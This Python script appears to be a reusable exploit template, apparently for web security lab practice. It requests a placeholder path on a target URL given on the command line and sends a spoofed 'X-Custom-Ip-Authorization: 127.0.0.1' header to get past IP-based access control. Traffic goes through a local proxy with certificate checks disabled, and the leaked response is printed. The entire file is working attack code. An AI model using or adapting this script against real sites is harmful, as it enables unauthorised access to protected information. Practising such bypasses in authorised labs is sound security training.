import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def information_disclosure_exploit(session, url) :
    
    exploit_url = url+"change_this"
    
    headers = {'X-Custom-Ip-Authorization': '127.0.0.1'}
    r = session.get(exploit_url, verify=False, headers=headers, proxies=proxies)
    
    if r.status_code == 200 :
        # print("")
        print(r.text)
    else :
        print("Failed to exploit the information disclosure flaw!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    information_disclosure_exploit(session, url)